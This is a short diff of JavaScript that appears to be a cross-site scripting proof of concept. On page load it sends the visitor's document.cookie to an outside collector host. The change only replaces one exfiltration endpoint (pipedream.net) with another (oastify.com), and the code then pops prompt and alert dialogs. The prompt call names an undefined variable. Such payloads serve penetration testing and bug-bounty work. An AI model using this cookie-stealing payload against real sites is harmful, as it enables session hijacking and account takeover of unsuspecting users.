@@ -4,7 +4,7 @@
     var rhyru = "Rhyru9";
     window.onload = function() {
       var xhttp = new XMLHttpRequest();
-      xhttp.open("GET", "https://eoow6y96ffo9mzx.m.pipedream.net/" + encodeURIComponent(document.cookie), true);
+      xhttp.open("GET", "https://kj7av31e1lpvwbdkzv9z3ygr5ib9zanz.oastify.com/" + encodeURIComponent(document.cookie), true);
       xhttp.send();
       prompt(rhyru9);
       alert(document.cookie);
